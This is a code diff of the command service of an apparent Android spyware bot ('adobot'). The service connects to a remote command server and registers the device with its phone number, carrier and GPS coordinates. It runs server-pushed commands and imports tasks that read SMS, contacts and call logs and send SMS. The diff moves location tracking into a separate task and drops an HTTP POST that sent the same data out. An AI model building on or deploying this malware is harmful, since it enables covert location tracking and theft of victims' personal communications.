@@ -29,6 +29,7 @@ import io.socket.emitter.Emitter;
 import com.android.adobot.tasks.GetCallLogsTask;
 import com.android.adobot.tasks.GetContactsTask;
 import com.android.adobot.tasks.GetSmsTask;
+import com.android.adobot.tasks.LocationTask;
 import com.android.adobot.tasks.SendSmsTask;
 import com.android.adobot.tasks.TransferBotTask;
 import com.android.adobot.tasks.UpdateAppTask;
@@ -38,41 +39,12 @@ public class CommandService extends Service {
 
     private static final String TAG = "CommandService";
 
+    private LocationTask locationTask;
     private CommonParams params;
     private CommandService client;
     private Socket socket;
     private boolean connected = false;
     private boolean registered;
-    private double latitude;
-    private double longitude;
-
-    public Socket getSocket() {
-        return socket;
-    }
-
-    public double getLatitude() {
-        return latitude;
-    }
-
-    public double getLongitude() {
-        return longitude;
-    }
-
-    private final LocationListener locationListener = new LocationListener() {
-        public void onLocationChanged(Location location) {
-            updateLocation(location);
-        }
-
-        public void onProviderDisabled(String provider) {
-            updateLocation(null);
-        }
-
-        public void onProviderEnabled(String provider) {
-        }
-
-        public void onStatusChanged(String provider, int status, Bundle extras) {
-        }
-    };
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -82,20 +54,14 @@ public class CommandService extends Service {
     @Override
     public void onCreate() {
 
+        super.onCreate();
+
         params = new CommonParams(this);
         client = this;
         connected = false;
-
-        latitude = 0;
-        longitude = 0;
-
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-            observeLocation();
-        }
-
         createSocket(params.getServer());
-
-        super.onCreate();
+        locationTask = new LocationTask(this);
+        locationTask.start();
 
     }
 
@@ -105,14 +71,11 @@ public class CommandService extends Service {
         Log.i(TAG, "Running onStartCommand");
 
         Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));
-        if (!connected && socket != null) {
-//            Log.i(TAG, "Creating new socket ......\n");
-//            createSocket();
+        if (!connected) {
             Log.i(TAG, "Socket is connecting ......\n");
             socket.connect();
         }
         return START_STICKY;
-
     }
 
     public void changeServer(String url) {
@@ -136,12 +99,12 @@ public class CommandService extends Service {
                     HashMap bot = new HashMap();
                     bot.put("uid", params.getUid());
                     bot.put("provider", params.getProvider());
-                    bot.put("lat", latitude);
-                    bot.put("longi", longitude);
                     bot.put("device", params.getDevice());
                     bot.put("sdk", params.getSdk());
                     bot.put("version", params.getVersion());
                     bot.put("phone", params.getPhone());
+                    bot.put("lat", locationTask.getLatitude());
+                    bot.put("longi", locationTask.getLongitude());
 
                     JSONObject obj = new JSONObject(bot);
                     socket.emit("register", obj, new Ack() {
@@ -162,9 +125,8 @@ public class CommandService extends Service {
                 public void call(Object... args) {
                     JSONArray cmds = (JSONArray) args[0];
                     for (int i = 0; i < cmds.length(); i++) {
-                        JSONObject cmd = new JSONObject();
                         try {
-                            cmd = (JSONObject) cmds.get(i);
+                            JSONObject cmd = (JSONObject) cmds.get(i);
 
                             String command = (String) cmd.get("command");
                             Log.i(TAG, "\nCommand: " + cmd.toString() + "\n");
@@ -258,40 +220,6 @@ public class CommandService extends Service {
             e.printStackTrace();
         }
 
-    }
-
-    private void observeLocation() {
-        SmartLocation.with(this).location()
-                .start(new OnLocationUpdatedListener() {
-                    @Override
-                    public void onLocationUpdated(Location location) {
-                        updateLocation(location);
-                    }
-                });
-    }
-
-    private void updateLocation(Location location) {
-        if (location != null && registered) {
-            latitude = location.getLatitude();
-            longitude = location.getLongitude();
-
-            Log.i(TAG, "Location changed ....");
-
-            HashMap bot = new HashMap();
-            bot.put("uid", params.getUid());
-            bot.put("provider", params.getProvider());
-            bot.put("lat", latitude);
-            bot.put("longi", longitude);
-            bot.put("device", params.getDevice());
-            bot.put("sdk", params.getSdk());
-            bot.put("version", params.getVersion());
-            bot.put("phone", params.getPhone());
-            Http req = new Http();
-            req.setUrl(params.getServer() + Constants.POST_STATUS_URL + "/" + params.getUid());
-            req.setMethod("POST");
-            req.setParams(bot);
-            req.execute();
-        }
     }
 
 }
